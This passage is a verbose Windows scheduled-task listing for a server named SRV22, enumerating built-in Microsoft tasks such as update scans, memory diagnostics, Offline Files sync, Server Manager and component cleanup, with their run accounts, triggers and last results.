Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\InstallService\ScanForUpdates
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 10:16:11 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only
Start Time:                           4:00:00 PM
Start Date:                           12/31/2013
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\InstallService\ScanForUpdatesAsUser
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\InstallService\WakeUpAndContinueUpdates
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\InstallService\WakeUpAndScanForUpdates
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           4:00:00 PM
Start Date:                           12/31/2013
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\Location
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Location\Notifications
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %windir%\System32\LocationNotificationWindows.exe
Start In:                             N/A
Comment:                              Location Notification
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Authenticated Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Location\WindowsActionDialog
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %windir%\System32\WindowsActionDialog.exe
Start In:                             N/A
Comment:                              Location Notification
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Authenticated Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Maintenance
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Maintenance\WinSAT
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Measures a system's performance and capabilities
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:30:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Maps
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Maps\MapsToastTask
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task shows various Map related toasts
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:00:05
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Maps\MapsUpdateTask
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task checks for updates to maps which you have downloaded for offline use. Disabling this task will prevent Windows from notifying you of updated maps.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          NETWORK SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:00:40
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           12:00:00 AM
Start Date:                           10/21/2014
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\MemoryDiagnostic
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Schedules a memory diagnostic in response to system events.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Schedules a memory diagnostic in response to system events.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Schedules a memory diagnostic in response to system events.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Schedules a memory diagnostic in response to system events.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Detects and mitigates problems in physical memory (RAM).
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Mobile Broadband Accounts
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft
Task To Run:                          %SystemRoot%\System32\MbaeParserTask.exe
Start In:                             N/A
Comment:                              Mobile Broadband Account Experience Metadata Parser
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:03:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\MUI
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\MUI\LPRemove
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\lpremove.exe
Start In:                             N/A
Comment:                              Launch language cleanup tool
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 09:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Multimedia
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Multimedia\SystemSoundsService
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              System Sounds User Mode Agent
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\NetTrace
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\NetTrace\GatherNetworkInfo
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft
Task To Run:                          %windir%\system32\gatherNetworkInfo.vbs
Start In:                             $(Arg1)
Comment:                              Network information collector
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Offline Files
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Offline Files\Background Synchronization
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task controls periodic background synchronization of Offline Files when the user is working in an offline mode.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Authenticated Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 24:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           12:00:00 AM
Start Date:                           1/1/2008
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        2 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Offline Files\Logon Synchronization
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task initiates synchronization of Offline Files when a user logs onto the system.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Authenticated Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 24:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\PLA
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\PLA\Server Manager Performance Monitor
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %systemroot%\system32\rundll32.exe %systemroot%\system32\pla.dll,PlaHost "Server Manager Performance Monitor" "$(Arg0)"
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Plug and Play
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Plug and Play\Device Install Group Policy
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 1:06:46 PM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Device Installation Group Policy Change Handler
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 24:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Plug and Play\Device Install Reboot Required
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:36:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Notifies the user that Windows needs to be restarted to finish setting up a device.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Plug and Play\Device Install Reboot Required
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:36:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Notifies the user that Windows needs to be restarted to finish setting up a device.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Plug and Play\Sysprep Generalize Drivers
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 9:34:01 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %SystemRoot%\System32\drvinst.exe 6
Start In:                             N/A
Comment:                              Generalize driver state in order to prepare the system to be bootable on any hardware configuration.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Power Efficiency Diagnostics
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:20:55 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task analyzes the system looking for conditions that may cause high energy use.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:05:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\RecoveryEnvironment
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\RecoveryEnvironment\VerifyWinRE
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Validates the Windows Recovery Environment.
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes
Power Management:                     No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Server Manager
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Server Manager\CleanupOldPerfLogs
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %systemroot%\system32\cscript.exe /B /nologo %systemroot%\system32\calluxxprovider.vbs $(Arg0) $(Arg1) $(Arg2)
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:02:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Server Manager\ServerManager
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:36:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\ServerManagerLauncher.exe
Start In:                             N/A
Comment:                              Task for launching Initial Configuration Tasks or Server Manager at logon.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Servicing
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Servicing\StartComponentCleanup
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\SharedPC
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\SharedPC\Account Cleanup
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %windir%\System32\rundll32.exe %windir%\System32\Windows.SharedPC.AccountManager.dll,StartMaintenance
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:30:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Shell
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Shell\CreateObjectTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 9:58:21 AM
Last Result:                          -2147020576
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Provides support for shell components that access system data
